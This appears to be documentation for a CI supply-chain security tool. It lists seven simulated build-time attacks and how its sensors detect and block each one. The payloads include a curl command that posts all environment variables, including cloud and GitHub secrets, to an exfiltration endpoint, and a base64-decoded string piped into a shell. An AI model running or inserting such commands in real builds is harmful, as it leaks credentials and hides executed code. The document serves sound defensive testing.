# PipeJack Attack Scenarios & Adversarial Validation Matrix

This document provides a detailed breakdown of the seven adversarial supply chain attack scenarios located in the `attacks/` directory. Each scenario replicates a real-world software supply chain vector, demonstrating how PipeJack's multi-sensor architecture detects and quarantines malicious builds.

---

## Master Attack Matrix

| Scenario | Attack Type | Vector / Trigger Mechanism | Primary Sensor | PDP Verdict | Quarantine Action |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **01** | Shell Execution | Direct `/bin/sh` or `/bin/bash` invocation in build lifecycle | `proctree` | `BLOCK (403)` | Image tagged `<tag>-quarantine`, deployment blocked |
| **02** | HTTP Exfiltration | Outbound `/usr/bin/curl` secret exfiltration to external host | `proctree` + `egressfw` | `BLOCK (403)` | Packets dropped, violation flagged, quarantined |
| **03** | Source Tampering | In-situ modification of source files (`src/**/*.java`) during build | `fschecker` | `BLOCK (403)` | Merkle root mismatch, violation flagged, quarantined |
| **04** | Obfuscated Exec | Base64-encoded command decoded and piped to shell | `proctree` | `BLOCK (403)` | Canonical binary `/bin/sh` intercepted via `/proc` |
| **05** | Multi-Stage Dropper | Staged downloader writing binary payload to `/tmp/dropper` | `fschecker` + `proctree` | `BLOCK (403)` | Unauthorized file creation and execution blocked |
| **06** | Trickling Exfiltration| Rate-limited socket connections to external address | `egressfw` + `netmon` | `BLOCK (403)` | Outbound TCP SYN dropped by iptables netns chain |
| **07** | Process/File Anomaly | Process explosion and rapid random file generation | `anomaly` + `proctree` | `BLOCK (403)` | Extreme z-score variance (\(|z| > 3.0\)) & process limit |

---

## Scenario Deep Dives

### Scenario 01: Unauthorized Shell Binary Execution (`01-shell-exec`)
- **Directory**: `attacks/01-shell-exec/`
- **Mechanism**:
  Simulates a malicious Maven compiler plugin or `npm postinstall` hook invoking `/bin/sh` or `/bin/bash` to execute unauthorized command strings.
- **Payload**:
  ```bash
  /bin/sh -c "echo 'Compromising build container...'"
  ```
- **Detection**:
  The Process Tree Differ (`proctree`) scans `/proc` in the container's cgroup every 150ms. It resolves the executable path to `/bin/sh`. The policy for the Java application only allows `/usr/bin/mvn` and `/opt/java/openjdk/bin/java`.
- **Verdict**: `BLOCK` (HTTP 403 Forbidden).

---

### Scenario 02: HTTP Curl Exfiltration (`02-http-exfil`)
- **Directory**: `attacks/02-http-exfil/`
- **Mechanism**:
  Simulates a compromised dependency exfiltrating environment variables (`AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN`) to an attacker-controlled command-and-control (C2) server via `curl`.
- **Payload**:
  ```bash
  curl -s -X POST -d "env=$(env)" http://192.168.88.132:9999/exfil || true
  ```
- **Detection**:
  1. `proctree` detects the execution of the forbidden `/usr/bin/curl` binary.
  2. `egressfw` in the container netns drops outbound TCP traffic targeted at non-loopback addresses.
- **Verdict**: `BLOCK` (HTTP 403 Forbidden).

---

### Scenario 03: Filesystem Merkle Tampering (`03-fs-tamper`)
- **Directory**: `attacks/03-fs-tamper/`
- **Mechanism**:
  Simulates in-situ source code tampering where a build script injects a backdoor or credential stealer into a source file before compilation:
- **Payload**:
  ```bash
  echo "// backdoor injected" >> src/main/java/com/bank/App.java
  ```
- **Detection**:
  `fschecker` computes the SHA-256 Merkle root of the `/workspace` directory pre-build. Post-build, it re-computes the Merkle root and detects that `src/main/java/com/bank/App.java` was modified. Because the policy forbids mutations in `src/**`, an immediate violation is generated.
- **Verdict**: `BLOCK` (HTTP 403 Forbidden).

---

### Scenario 04: Base64-Obfuscated Shell Invocation (`04-base64-shell`)
- **Directory**: `attacks/04-base64-shell/`
- **Mechanism**:
  Simulates an attacker attempting to bypass string-matching scanners by encoding the malicious payload in Base64:
- **Payload**:
  ```bash
  echo "ZWNobyAnaGFja2VkJw==" | base64 -d | sh
  ```
- **Detection**:
  Regardless of string obfuscation or argument encoding, the Linux kernel still creates a process executing `/bin/sh`. `proctree` inspects the kernel `/proc/<pid>/exe` link directly from the host cgroup, instantly catching the unapproved shell interpreter.
- **Verdict**: `BLOCK` (HTTP 403 Forbidden).

---

### Scenario 05: Multi-Stage Dropper & Payload Execution (`05-multi-stage`)
- **Directory**: `attacks/05-multi-stage/`
- **Mechanism**:
  Simulates a staged attack: Stage 1 creates a hidden executable script in `/tmp` or the workspace, Stage 2 marks it executable (`chmod +x`), and Stage 3 executes the staged dropper.
- **Detection**:
  Detected across two layers: `fschecker` flags the unauthorized file addition in non-build paths, and `proctree` catches the staged binary execution.
- **Verdict**: `BLOCK` (HTTP 403 Forbidden).

---

### Scenario 06: Slow Exfiltration / Socket Trickle (`06-slow-exfil`)
- **Directory**: `attacks/06-slow-exfil/`
- **Mechanism**:
  Simulates a stealthy exfiltration script opening raw Python sockets to drip bytes out to an external IP at low packet rates to evade volume thresholds.
- **Detection**:
  `egressfw` drops all unauthorized non-loopback outbound SYN packets at the network namespace firewall level. Concurrently, `netmon` reading `/proc/net/tcp` catches the connection attempt.
- **Verdict**: `BLOCK` (HTTP 403 Forbidden).

---

### Scenario 07: Statistical Anomaly Explosion (`07-anomaly`)
- **Directory**: `attacks/07-anomaly/`
- **Mechanism**:
  Simulates a compiler bomb or crypto-miner dependency spawning dozens of worker processes and mutating thousands of files.
- **Detection**:
  The anomaly engine (`internal/anomaly`) evaluates four telemetry metrics against the rolling baseline. The process count and file mutation count exceed \(|z| > 3.0\), generating high-severity anomaly findings.
- **Verdict**: `BLOCK` (HTTP 403 Forbidden).

---

## Running the Master Attack Suite

From the developer environment (VM-1):

```bash
cd attacks
./run-all.sh
```

The master script executes all 7 scenarios sequentially, verifies that the CI orchestrator returns HTTP 403 Forbidden for each, and validates that the resulting images are quarantined rather than published to production.
